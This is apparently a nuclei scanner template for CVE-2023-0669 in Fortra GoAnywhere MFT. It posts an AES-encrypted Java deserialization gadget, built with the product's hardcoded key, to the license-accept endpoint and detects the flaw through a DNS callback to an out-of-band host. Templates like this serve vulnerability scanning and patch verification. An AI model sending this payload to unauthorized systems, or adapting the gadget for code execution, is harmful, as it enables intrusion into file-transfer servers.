id: yaml-poc-fortra-goanywhere_managed_file_transfer-logical-CVE-2023-0669

info:
  name: yaml-poc-fortra-goanywhere_managed_file_transfer-logical-CVE-2023-0669
  author: jiapeng.han
  severity: high
  tags: xray-converted,cve-2023-0669
  reference:
    - http://packetstormsecurity.com/files/171789/Goanywhere-Encryption-Helper-7.1.1-Remote-Code-Execution.html
    - https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis
    - https://duo.com/decipher/fortra-patches-actively-exploited-zero-day-in-goanywhere-mft
    - https://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html
    - https://github.com/rapid7/metasploit-framework/pull/17607
    - https://infosec.exchange/@briankrebs/109795710941843934
    - https://my.goanywhere.com/webclient/ViewSecurityAdvisories.xhtml#zerodayfeb1
    - https://www.rapid7.com/blog/post/2023/02/03/exploitation-of-goanywhere-mft-zero-day-vulnerability/

http:
  - raw:
      - |
        POST /goanywhere/lic/accept HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bundle={{concat(url_encode(base64(aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{reverse.url}}", "base64")), base64_decode("Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA==")))), '$2')}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "GoAnywhere"